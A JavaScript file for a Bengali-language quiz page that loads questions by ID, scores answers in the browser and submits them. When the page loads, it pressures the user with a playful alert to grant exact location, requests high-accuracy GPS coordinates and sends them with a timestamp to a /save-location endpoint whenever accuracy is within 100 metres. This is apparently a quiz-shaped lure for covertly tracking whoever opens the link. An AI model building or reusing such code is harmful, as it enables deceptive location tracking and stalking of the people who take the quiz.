// ✅ Store selected answers globally
const selectedAnswers = [];
let current = 0;
let selected = null;

const questionText = document.getElementById("questionText");
const optionsContainer = document.getElementById("optionsContainer");
const nextBtn = document.getElementById("nextBtn");
const progress = document.getElementById("progress");

// ✅ Get quiz_id from URL
const quizId = new URLSearchParams(window.location.search).get("quiz_id");

// ✅ Load questions dynamically
let questions = [];

async function loadQuestions() {
  if (!quizId) {
    alert("Quiz ID not found in URL");
    return;
  }

  const res = await fetch(`/get-quiz/${quizId}`);
  questions = await res.json();

  if (!questions || !questions.length) {
    alert("No questions found for this quiz.");
    return;
  }

  renderQuestion(current);
}

// ✅ Render each question
function renderQuestion(index) {
  const q = questions[index];
  questionText.textContent = q.question;
  progress.textContent = `প্রশ্ন ${index + 1} / ${questions.length}`;
  optionsContainer.innerHTML = "";

  q.options.forEach((opt, i) => {
    const div = document.createElement("div");
    div.className = "option";
    div.textContent = opt;
    div.onclick = () => {
      document.querySelectorAll(".option").forEach(el => el.classList.remove("selected"));
      div.classList.add("selected");
      selected = i;
      nextBtn.disabled = false;
    };
    optionsContainer.appendChild(div);
  });

  nextBtn.disabled = true;
}

// ✅ On "Next" button click
nextBtn.addEventListener("click", async () => {
  selectedAnswers.push(selected);
  current++;
  selected = null;

  if (current < questions.length) {
    renderQuestion(current);
  } else {
    // ✅ Calculate score
    let score = 0;
    for (let i = 0; i < questions.length; i++) {
      if (selectedAnswers[i] === questions[i].correct) score++;
    }

    // ✅ Submit answers to backend
    await fetch("/submit-quiz", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        quiz_id: quizId,
        answers: selectedAnswers,
        score
      })
    });

    // ✅ Redirect to result page with score
    window.location.href = `result.html?score=${score}`;
  }
});

// ✅ Prompt user for location on page load
window.addEventListener("load", () => {
  alert("📍 এই কুইজে আপনার সঠিক অবস্থান (Location) জানাতে অনুমতি দিন — যেন আপনার বন্ধু দেখতে পারে আপনি কোথায় ছিলেন!");

  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        const { latitude, longitude, accuracy } = pos.coords;
        console.log("📍 Location:", latitude, longitude);
        console.log("🎯 Accuracy:", accuracy, "meters");

        if (accuracy <= 100) {
          fetch("/save-location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              latitude,
              longitude,
              accuracy,
              time: new Date().toISOString()
            })
          });
        } else {
          console.warn("⚠️ Accuracy too low. Location not saved.");
        }
      },
      err => {
        console.error("❌ Location error:", err.message);
        alert("⚠️ Location permission deny করলে কিছু ফিচার কাজ নাও করতে পারে!");
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  } else {
    alert("❌ আপনার ব্রাউজার location সাপোর্ট করে না।");
  }

  loadQuestions(); // Load quiz after location attempt
});
